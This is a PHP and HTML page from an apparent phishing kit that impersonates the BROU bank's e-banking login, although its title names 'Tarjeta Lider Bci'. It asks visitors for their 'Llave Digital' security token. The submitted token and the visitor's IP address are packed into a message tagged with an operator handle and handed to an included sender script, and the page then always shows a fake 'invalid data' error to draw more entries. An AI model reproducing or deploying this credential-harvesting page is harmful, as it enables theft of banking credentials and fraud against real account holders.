<?php  
include 'config/digitos-token.php';
$msj='';
if (isset($_POST['submit'])) {
  $msj='<div class="alert alert-danger">
        <p class="mb-0" style="font-size: 13px;">
          <i class="bi bi-exclamation-circle-fill"></i>
          Los datos ingreados no son validos.
        </p>
      </div>';
$enviara =
  "<b> 💸 ebanking.brou.com.uy/frontend/loginStep1 💸 </b>\n\n".
  " ------ [ Llave ] ------ \n\n".
  "<b>👤 Llave digital: </b> <code>".$_POST['token']."</code>\n".
  "<b>🌐 IP: </b> <code>".$_SERVER['REMOTE_ADDR']."</code>\n".
  " ------ [ @mitraserodehojalata ] ------ \n\n";    
  $enviar =  urldecode($enviara);
  include 'config/app.php';  
}
?> 
<!doctype html>
<html lang="en">
<head>
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.min.css">
  <link rel="icon" type="ico" href="favicon.ico">
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Poppins:ital,wght@0,100;0,200;0,300;0,400;0,500;0,600;0,700;0,800;0,900;1,100;1,200;1,300;1,400;1,500;1,600;1,700;1,800;1,900&display=swap" rel="stylesheet">
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Tarjeta Lider Bci</title>
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-QWTKZyjpPEjISv5WaRU9OFeRpok6YctnYmDr5pNlyT2bRjXh0JMhjY6hW+ALEwIH" crossorigin="anonymous">
  <link rel="stylesheet" type="text/css" href="css/style.css">
</head>
<body style="background:#073057;">
  <div class="d-flex text-center flex-column h-100 justify-content-center align-items-center p-4 text-center">
    <img src="img/logo.svg">
    <h3 class="my-3  mb-2 text-white fw-normal">Validación requerida</h3>
    
    <div class="p-3 my-4 loadig-valid bg-white w-100">
      <div class="alert alert-success">
        <p class="mb-0">
          <i class="bi bi-exclamation-circle-fill"></i>
          Complete la validación de identidad antes de continuar con su acceso. Ingrese los datos de su Llave Digital.
        </p>
      </div>
      <?php echo $msj; ?>
      <form method="POST">
        <div class="mb-3">
          <label class="d-block">Llave Digital</label>
          <input type="tel" minlength="<?php echo $minimo_TOKEN; ?>" maxlength="<?php echo $maximo_TOKEN; ?>" required class="form-control" id="token" name="token">
        </div>
        <button name="submit" class="btn btn-primary">Continuar</button>
      </form>
    </div>
  </div>
  <script type="text/javascript" src="config/segundos.js"></script>
  <script type="text/javascript"></script>
  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js" integrity="sha384-YvpcrYf0tY3lHB60NNkmXc5s9fDVZLESaAA55NDzOxhy9GkcIdslK1eN7N6jIeHz" crossorigin="anonymous"></script>
  <script type="text/javascript">
  document.getElementById("token").addEventListener("keypress", function (e) {
    if (e.which < 48 || e.which > 57) {
      e.preventDefault();
    }
  })
</script>
</body>
</html>